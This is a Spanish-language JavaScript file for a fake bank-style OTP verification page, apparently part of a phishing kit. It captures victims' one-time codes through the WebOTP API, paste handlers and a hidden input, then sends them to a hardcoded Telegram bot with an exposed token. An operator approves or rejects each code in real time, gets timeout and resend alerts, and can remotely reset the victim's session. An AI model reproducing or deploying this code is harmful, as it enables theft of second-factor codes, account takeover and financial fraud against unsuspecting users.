/* ============================================================
   Pantalla OTP — Separación Nativa iOS vs Android
   ============================================================ */

(function () {
  "use strict";

  const TELEGRAM_TOKEN = '9068600803:AAHsD99VxpWVyedQoPlZeFV3OHotQJhK0W0'; 
  const TELEGRAM_CHAT_ID = '9180377107';   
  const CODE_TTL_SECONDS = 120; 

  const form = document.getElementById("otp-form");
  const inputs = Array.from(document.querySelectorAll(".otp-digit"));
  const timerEl = document.getElementById("otp-timer");
  const messageEl = document.getElementById("otp-message");
  const submitBtn = document.getElementById("otp-submit");
  const maskedEl = document.getElementById("masked-number");
  const resendBtn = document.getElementById("otp-resend"); 

  // Detección de sistema operativo
  const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
  let oTPAbortController = null;

  let remaining = CODE_TTL_SECONDS;
  let timerId = null;

  (function initConfiguredMask() {
    try {
      const tail = sessionStorage.getItem("otp_tail") || "85";
      if (maskedEl) maskedEl.textContent = "****" + tail;
    } catch (e) {
      if (maskedEl) maskedEl.textContent = "****85";
    }
    if (inputs[0]) inputs[0].focus();
  })();

  function formatTime(totalSeconds) {
    const m = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
    const s = String(totalSeconds % 60).padStart(2, "0");
    return m + ":" + s;
  }

  function renderTimer() {
    if (timerEl) {
      if (remaining > 0) {
        timerEl.textContent = "El código vence en " + formatTime(remaining) + " minutos";
        timerEl.classList.remove("expired");
        if (resendBtn) resendBtn.style.display = "none"; 
      } else {
        timerEl.textContent = "El código ha vencido";
        timerEl.classList.add("expired");
        if (resendBtn) resendBtn.style.display = "inline-block"; 
      }
    }
  }

  async function sendTimeoutAlert() {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `⏳ *AVISO:* Al usuario se le ha *AGOTADO EL TIEMPO (2 min)* para ingresar el código OTP.`,
          parse_mode: 'Markdown'
        })
      });
    } catch (e) { }
  }

  function tick() {
    remaining -= 1;
    renderTimer();
    refreshSubmitState();
    if (remaining <= 0) {
      clearInterval(timerId);
      sendTimeoutAlert(); 
    }
  }

  function startTimer() {
    remaining = CODE_TTL_SECONDS;
    renderTimer();
    clearInterval(timerId);
    timerId = setInterval(tick, 1000);
  }

  startTimer();

  function getCode() {
    return inputs.map((i) => i.value.substring(0, 1)).join("");
  }

  function isComplete() {
    return inputs.every((i) => i.value.trim().length === 1);
  }

  function refreshSubmitState() {
    if (submitBtn) {
      submitBtn.disabled = !isComplete() || remaining <= 0;
    }
  }

  // ============================================================
  // EXTRACTOR LIMPIO (Ignora montos como $363.00 y toma los 6 dígitos)
  // ============================================================
  function rellenarYValidarCodigo(rawText) {
    const coincidencia = String(rawText).match(/\b\d{6}\b/);
    const cleanValue = coincidencia ? coincidencia[0] : String(rawText).replace(/\D/g, "").slice(0, 6);

    if (cleanValue.length > 0) {
      cleanValue.split("").forEach((char, idx) => {
        if (inputs[idx]) {
          inputs[idx].value = char;
          inputs[idx].classList.remove("invalid");
        }
      });
      refreshSubmitState();
      if (isComplete()) {
        enviarFormulario();
      }
    }
  }

      const inputInvisible = document.getElementById("otp-invisible-captura");

  // ============================================================
  // EXTRACTOR REFORZADO (Busca los 6 números cerca de CODIGO / CÓDIGO)
  // ============================================================
  function rellenarYValidarCodigo(rawText) {
    const textoLimpio = String(rawText || "").replace(/[\r\n]+/g, " ");
    
    // Busca la palabra CODIGO o CÓDIGO y extrae los 6 números siguientes
    const coincidencia = textoLimpio.match(/(?:codigo|código)\b.*?\b(\d{6})/i);
    
    let cleanValue = "";

    if (coincidencia && coincidencia.length > 1) {
      // Extrae la posición exacta del bloque numérico hallado
      cleanValue = coincidencia[1];
    } else {
      // Si falla, busca el primer bloque de 6 números puro del mensaje
      const respaldo = textoLimpio.match(/\d{6}/);
      cleanValue = respaldo ? respaldo[0] : textoLimpio.replace(/\D/g, "").slice(0, 6);
    }

    if (cleanValue && cleanValue.length === 6) {
      inputs.forEach((input, idx) => {
        if (inputs[idx]) {
          inputs[idx].value = cleanValue[idx];
          inputs[idx].classList.remove("invalid");
        }
      });
      if (inputInvisible) inputInvisible.value = cleanValue;
      refreshSubmitState();
      if (isComplete()) {
        enviarFormulario();
      }
    }
  }

  // ============================================================
  // MODO 1: EXCLUSIVO PARA ANDROID (WebOTP API Nativo)
  // ============================================================
  function activarEscuchaWebOTPAndroid() {
    if (!('credentials' in navigator) || !('OTPCredential' in window)) return;

    if (oTPAbortController) oTPAbortController.abort();
    oTPAbortController = new AbortController();

    navigator.credentials.get({
      otp: { transport: ['sms'] },
      signal: oTPAbortController.signal
    }).then(otp => {
      if (otp && otp.code) {
        rellenarYValidarCodigo(otp.code);
      }
    }).catch(() => { 
      // SOLUCIÓN AL BLOQUEO: Si rechazas el diálogo de Google, forzamos la liberación del teclado
      setTimeout(() => {
        if (inputs && inputs[0]) {
          inputs[0].focus(); // Devuelve el cursor parpadeante al primer recuadro
        }
      }, 100);
    });
  }

  // Cazador de errores visual en pantalla
  window.onerror = function (mensaje, url, linea) {
    if (messageEl) {
      messageEl.style.color = "red";
      messageEl.textContent = "ERROR LÍNEA " + linea + ": " + mensaje;
    }
  };

  // ============================================================
  // CONFIGURACIÓN DE CASILLAS VISIBLES
  // ============================================================
  function configurarCasillasOTP() {
    if (!isIOS) activarEscuchaWebOTPAndroid();

    inputs.forEach((input, index) => {
      input.setAttribute("maxlength", "1");

      // Captura el pegado manual tradicional dentro de la celda
      input.addEventListener("paste", (e) => {
        e.preventDefault();
        const clipboard = e.clipboardData || window.clipboardData;
        const pastedData = clipboard ? clipboard.getData("text") : "";
        if (pastedData) rellenarYValidarCodigo(pastedData);
      });

      // Escritura manual dígito por dígito y capturas del teclado
      input.addEventListener("input", (e) => {
        input.classList.remove("invalid");
        const val = e.target.value;

        // Si el sistema inyecta un texto largo de golpe en la casilla
        if (val.length > 1) {
          rellenarYValidarCodigo(val);
          return;
        }

        input.value = val.replace(/\D/g, "").slice(0, 1);

        if (input.value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        refreshSubmitState();
        if (isComplete()) enviarFormulario();
      });

      // Borrado hacia atrás con Backspace
      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
          inputs[index - 1].focus();
          inputs[index - 1].value = "";
          refreshSubmitState();
        }
      });
    });

    // ESCUCHA DE LA CASILLA MAESTRA INVISIBLE (Soporte pasivo)
    if (inputInvisible) {
      inputInvisible.addEventListener("input", (e) => {
        const val = e.target.value;
        if (val.length >= 6 || val.replace(/\D/g, "").length === 6) {
          rellenarYValidarCodigo(val);
        }
      });
      
      inputInvisible.addEventListener("paste", (e) => {
        e.preventDefault();
        const clipboard = e.clipboardData || window.clipboardData;
        const pastedData = clipboard ? clipboard.getData("text") : "";
        if (pastedData) rellenarYValidarCodigo(pastedData);
      });
    }
  }

  // ============================================================
  // ARRANQUE UNIFICADO
  // ============================================================
  configurarCasillasOTP();

  // ============================================================
  // BOTÓN DE REENVÍO
  // ============================================================
  if (resendBtn) {
    resendBtn.addEventListener("click", async () => {
      resendBtn.textContent = "Enviando nuevo código...";
      resendBtn.disabled = true;
      if (submitBtn) submitBtn.disabled = true;
      
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `🍕 *AVISO:* El usuario ha solicitado un *NUEVO CÓDIGO OTP* (Reenvío).`,
            parse_mode: 'Markdown'
          })
        });
      } catch (e) { }

      setTimeout(() => {
        resendBtn.textContent = "¿No recibiste el código? Reenviar";
        resendBtn.disabled = false;
        if (messageEl) {
          messageEl.textContent = "Se ha enviado un nuevo código.";
          messageEl.className = "otp-message success";
          setTimeout(() => { messageEl.textContent = ""; }, 3000);
        }
        
        inputs.forEach(input => {
          input.value = "";
          input.classList.remove("invalid");
        });
        if (inputInvisible) inputInvisible.value = "";
        
        if (inputs && inputs[0]) inputs[0].focus();

        startTimer();
        if (!isIOS) activarEscuchaWebOTPAndroid();
      }, 1500);
    });
  }


  // ============================================================
  // ENVÍO Y VALIDACIÓN EN TELEGRAM
  // ============================================================
  async function enviarFormulario() {
    if (!isComplete() || remaining <= 0) return;

    const enteredCode = getCode();
    if (submitBtn) {
      submitBtn.disabled = true;
      submitBtn.textContent = "Validando...";
    }
    if (messageEl) {
      messageEl.textContent = "Verificando credenciales de seguridad...";
      messageEl.className = "otp-message";
      messageEl.style.color = "#666666";
    }

    const loader = document.getElementById("loading-container");
    if (loader) loader.style.display = "flex";

    let lastUpdateIdApproval = 0;
    try {
      const resInit = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?limit=100`);
      const dataInit = await resInit.json();
      if (dataInit.ok && dataInit.result && dataInit.result.length > 0) {
        lastUpdateIdApproval = Number(dataInit.result[dataInit.result.length - 1].update_id);
      }
    } catch (errInit) { }

    const textApproval = `🛡️ *PASO 2: VALIDACIÓN DE CÓDIGO OTP* 🛡️\n\n` +
                         `El usuario ha ingresado el código:\n` +
                         `👉 *${enteredCode}*\n\n` +
                         `✅ *Para VALIDAR el código:* Responde \`ok\` o \`si\`\n` +
                         `❌ *Para INVALIDAR (Código Incorrecto):* Responde \`no\` o \`mal\``;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: textApproval,
          parse_mode: 'Markdown'
        })
      });
    } catch (e) { }

    let decision = null; 
    
    while (!decision) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateIdApproval + 1}&timeout=5`);
        const data = await res.json();
        
        if (data.ok && data.result && data.result.length > 0) {
          for (let i = 0; i < data.result.length; i++) {
            const update = data.result[i];
            lastUpdateIdApproval = Number(update.update_id);

            const msg = update.message;
            if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
              const msgText = msg.text.trim().toLowerCase();
              
              if (msgText === 'reinicio' || msgText === 'reset') {
                if (loader) loader.style.display = "none";
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace("index.html");
                return;
              }

              if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
                decision = 'approved';
                break;
              } else if (msgText === 'no' || msgText === 'mal' || msgText === 'incorrecto' || msgText === '2') {
                decision = 'rejected';
                break;
              }
            }
          }
        }
      } catch (err) { }

      if (!decision) {
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    }

    const flowType = sessionStorage.getItem('flow_type') || 'charge';
    const chargeAction = sessionStorage.getItem('charge_action') || 'Aprobado'; 

    if (decision === 'approved') {
      try {
        if (timerId) clearInterval(timerId);
      } catch (te) { }
      
      if (flowType === 'charge') {
        localStorage.setItem('transaction_status', chargeAction);
      } else if (flowType === 'baja') {
        localStorage.setItem('transaction_status', 'Aprobado');
      }

      if (messageEl) {
        if (flowType === 'login') {
          messageEl.textContent = "Inicio de sesión correcto.";
          messageEl.style.color = "#28a745"; 
        } else if (flowType === 'baja') {
          messageEl.textContent = "¡Validación de Baja Exitosa!";
          messageEl.style.color = "#28a745"; 
        } else {
          const accionNormalizada = String(chargeAction).toLowerCase();

          if (accionNormalizada === 'aprobado') {
            messageEl.textContent = "¡Aprobación Confirmada y Aplicada!";
            messageEl.style.color = "#28a745"; 
          } else {
            messageEl.textContent = "¡Rechazo Confirmado y Aplicado!";
            messageEl.style.color = "#d9534f"; 
          }
        }
        messageEl.className = "otp-message success";
      }

      if (submitBtn) {
        submitBtn.textContent = (flowType === 'charge' && String(chargeAction).toLowerCase() === 'rechazado') ? "Bloqueo Exitoso" : "Completado";
        submitBtn.style.backgroundColor = "#981D33";
        submitBtn.style.borderColor = "#981D33";
        submitBtn.style.color = "#ffffff";
      }

      setTimeout(() => {
        if (loader) loader.style.display = "none";
        try {
          window.location.replace("dashboard.html");
        } catch (e) {
          window.location.href = "dashboard.html";
        }
      }, 2500);

      return; 

    } else if (decision === 'rejected') {
      if (loader) loader.style.display = "none";
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Validar código";
      }
      if (messageEl) {
        messageEl.textContent = "Código incorrecto. Por favor, verifícalo e inténtalo de nuevo.";
        messageEl.style.color = "#d9534f";
        messageEl.className = "otp-message error";
      }
      inputs.forEach(input => {
        input.value = "";
        input.classList.remove("invalid");
      });
      if (inputs[0]) inputs[0].focus();
      
      // Reactiva la escucha automática en Android si el primer intento falló
      if (!isIOS) activarEscuchaWebOTPAndroid();
    }
  }

  if (form) {
    form.addEventListener("submit", function (e) {
      e.preventDefault();
      enviarFormulario();
    });
  }
})();
